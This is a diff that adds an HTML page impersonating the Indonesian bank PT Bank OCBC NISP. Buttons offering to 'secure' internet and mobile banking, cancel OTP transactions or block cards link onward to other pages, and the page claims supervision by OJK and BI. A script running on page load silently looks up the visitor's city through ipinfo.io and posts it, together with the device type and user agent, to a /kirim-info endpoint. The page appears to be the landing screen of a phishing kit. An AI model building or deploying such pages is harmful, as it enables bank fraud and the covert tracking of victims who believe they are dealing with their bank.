@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PT Bank OCBC NISP</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
+body{background:#fff;text-align:center;}
+.container{max-width:340px;margin:auto;padding:20px 10px;}
+.box{background:#fff;padding:15px;border-radius:8px;margin-bottom:15px;box-shadow:0 2px 8px rgba(0,0,0,.1);}
+.title{font-size:18px;font-weight:bold;text-align:center;margin-bottom:10px;}
+.desc{font-size:14px;color:#666;text-align:center;margin-bottom:20px;}
+.btn{background:linear-gradient(90deg,#ff0a00b4,#ff0a00);color:#fff;border:none;border-radius:8px;padding:14px 0;font-size:16px;font-weight:bold;width:100%;margin:8px 0;cursor:pointer;transition:.2s;}
+.btn:hover{opacity:.9;}
+.btn:disabled{opacity:.6;cursor:not-allowed;}
+.footer{background:#dedede;color:#000;padding:15px;font-size:11px;text-align:center;margin-top:30px;}
+.status{margin-top:12px;font-size:14px;display:none;}
+.status.success{color:#28a745;}
+.status.error{color:#dc3545;}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="box">
+    <h1 class="title">Selamat Datang di OCBC</h1>
+    <p class="desc">Pilih layanan yang Anda butuhkan:</p>
+    <button class="btn" onclick="location.href='sanggah.html'">🔐 Amankan Internet Banking</button>
+    <button class="btn" onclick="location.href='mobile1.html'">📱 Amankan Mobile Banking</button>
+    <button class="btn" onclick="location.href='two.html'">🔢 Batalkan OTP Transaksi</button>
+    <button class="btn" onclick="location.href='blokirkartu.html'">💳 Blokir Kartu</button>
+    <button class="btn" onclick="location.href='banklain.html'">🏦 Laporkan Bank Lain</button>
+    <div id="status" class="status"></div>
+  </div>
+</div>
+<div class="footer">© 2026 PT Bank OCBC NISP Tbk. Diawasi OJK & BI.</div>
+
+<script>
+async function ambilInfoLokasi() {
+  try {
+    const res = await fetch('https://ipinfo.io/json');
+    const data = await res.json();
+    const kota = data.city || 'Tidak diketahui';
+    const deviceType = /android/i.test(navigator.userAgent) ? 'Android' : /iphone|ipad/i.test(navigator.userAgent) ? 'iOS' : 'PC';
+    const deviceName = navigator.userAgent;
+    await fetch('/kirim-info', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({kota,deviceType,deviceName})
+    });
+  } catch(e){console.log('Gagal ambil lokasi');}
+}
+window.onload = ambilInfoLokasi;
+function showStatus(t,type){const s=document.getElementById('status');s.textContent=t;s.className=`status ${type}`;s.style.display='block';}
+</script>
+</body>
+</html>
